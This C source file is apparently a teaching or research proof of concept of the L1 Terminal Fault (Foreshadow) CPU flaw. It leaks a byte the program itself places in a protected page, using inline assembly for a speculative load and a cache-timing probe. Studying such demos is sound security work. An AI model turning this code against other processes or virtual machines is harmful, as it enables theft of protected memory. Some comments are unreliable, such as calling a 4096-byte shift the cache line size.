#include "utils.c"

// --- L1 Terminal Fault (L1TF / Foreshadow) ---

uint8_t secret_l1tf_byte = 'L';
volatile uint8_t *g_l1tf_secret_page = NULL; // Will point to an unmapped page

static sigjmp_buf jmpbuf_l1tf;

void sigsegv_handler_l1tf(int sig)
{
    // Reset signal handler to default to prevent infinite loops
    signal(SIGSEGV, SIG_DFL);
    siglongjmp(jmpbuf_l1tf, 1);
}

int main()
{
    common_init();
    printf("\n--- Running L1 Terminal Fault (L1TF) Demo ---\n");

    // Allocate a page that we can write to initially, then make it unmapped
    // This simulates the L1TF condition where data exists in cache but page is unmapped
    size_t page_size = getpagesize();
    g_l1tf_secret_page = (uint8_t *)mmap(NULL, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (g_l1tf_secret_page == MAP_FAILED)
    {
        perror("mmap");
        return 1;
    }

    // Place a "secret" at an offset within this page
    *(g_l1tf_secret_page + 0x100) = secret_l1tf_byte;

    // Now make the page unmapped to simulate L1TF condition
    if (mprotect(g_l1tf_secret_page, page_size, PROT_NONE) == -1)
    {
        perror("mprotect");
        munmap((void *)g_l1tf_secret_page, page_size);
        return 1;
    }

    // Verify the page is now unmapped by trying to access it (should segfault)
    printf("Page is now unmapped. Testing signal handler...\n");
    if (sigsetjmp(jmpbuf_l1tf, 1) == 0)
    {
        volatile uint8_t test = *(g_l1tf_secret_page + 0x100); // This should segfault
        (void)test;                                            // Suppress unused variable warning
        printf("ERROR: Page is still accessible!\n");
        munmap((void *)g_l1tf_secret_page, page_size);
        return 1;
    }
    else
    {
        printf("Signal handler working correctly. Starting L1TF attack...\n");
    }

    // Set up signal handler to catch segmentation faults
    if (signal(SIGSEGV, sigsegv_handler_l1tf) == SIG_ERR)
    {
        perror("signal");
        munmap((void *)g_l1tf_secret_page, page_size);
        return 1;
    }

    printf("Attempting L1TF-style transient read from unmapped page...\n");
    printf("Secret byte: %c (0x%02x)\n", secret_l1tf_byte, secret_l1tf_byte);

    for (int attempt = 0; attempt < 500; ++attempt)
    {
        flush_probe_array();

        if (sigsetjmp(jmpbuf_l1tf, 1) == 0)
        {
            // The core of L1TF: speculative load from a "not present" but L1-cached address.
            // This is the same inline assembly as Meltdown, but the context (PTE state) is key.
            // The address must be in a general-purpose register L1TF prefers (r12, r13, r14, r9, r10, rdi, rdx).
            __asm__ __volatile__(
                "1:\n\t"
                "movq (%0), %%rax\n\t"         // Speculatively load from g_l1tf_secret_page+0x100 into RAX
                                               // This triggers the L1TF condition (PTE.P=0)
                "shl $12, %%rax\n\t"           // Shift RAX (leaked byte) by cache line size
                "movq (%1, %%rax, 1), %%rbx\n" // Access probe_array[leaked_byte * CACHE_LINE_SIZE]
                "2:\n\t"
                :
                : "r"(g_l1tf_secret_page + 0x100), "r"(probe_array)
                : "rax", "rbx", "memory");
        }
        else
        {
            // Signal was caught, ensure speculative effects are visible
            _mm_lfence(); // Fence to ensure speculative writes to cache are visible
        }

        // --- Measurement Phase ---
        if (perform_measurement(secret_l1tf_byte, "L1TF secret"))
        {
            munmap((void *)g_l1tf_secret_page, page_size);
            return 0;
        }
    }

    printf("Failed to leak the L1TF secret byte.\n");
    printf("Actual secret data: %c\n", secret_l1tf_byte);
    munmap((void *)g_l1tf_secret_page, page_size);
    return 0;
}